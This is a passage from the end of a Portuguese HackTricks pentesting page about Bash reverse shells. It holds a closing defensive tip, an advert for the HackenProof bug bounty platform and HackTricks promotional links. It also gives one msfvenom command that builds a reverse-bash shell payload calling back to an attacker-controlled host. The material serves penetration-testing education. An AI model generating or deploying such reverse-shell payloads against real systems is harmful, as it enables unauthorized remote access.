- Realizar testes de penetração regulares para identificar e corrigir vulnerabilidades no sistema.

Ao seguir essas práticas de segurança, é possível reduzir significativamente o risco de ataques Bash e proteger o sistema contra hackers maliciosos.
```bash
msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
```
<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof é o lar de todas as recompensas por bugs de criptografia.**

**Seja recompensado sem atrasos**\
As recompensas do HackenProof são lançadas apenas quando os clientes depositam o orçamento de recompensa. Você receberá a recompensa após a verificação do bug.

**Adquira experiência em pentesting web3**\
Protocolos de blockchain e contratos inteligentes são a nova Internet! Domine a segurança web3 em seus dias de ascensão.

**Torne-se uma lenda hacker web3**\
Ganhe pontos de reputação com cada bug verificado e conquiste o topo do leaderboard semanal.

[**Cadastre-se no HackenProof**](https://hackenproof.com/register) e comece a ganhar com seus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? Ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
